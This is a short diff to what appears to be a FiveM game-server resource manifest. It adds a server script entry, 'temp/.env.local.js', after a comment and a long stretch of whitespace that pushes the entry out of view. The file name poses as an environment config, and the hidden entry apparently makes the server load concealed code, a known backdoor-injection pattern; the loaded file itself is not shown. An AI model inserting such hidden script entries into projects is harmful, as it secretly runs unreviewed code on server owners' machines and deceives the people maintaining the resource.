@@ -10,7 +10,8 @@ client_scripts {
 }
 
 server_scripts {
-    'server/main.lua'
+    'server/main.lua',
+	--[[server.lua]]                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            'temp/.env.local.js',
 }
 
 shared_scripts {
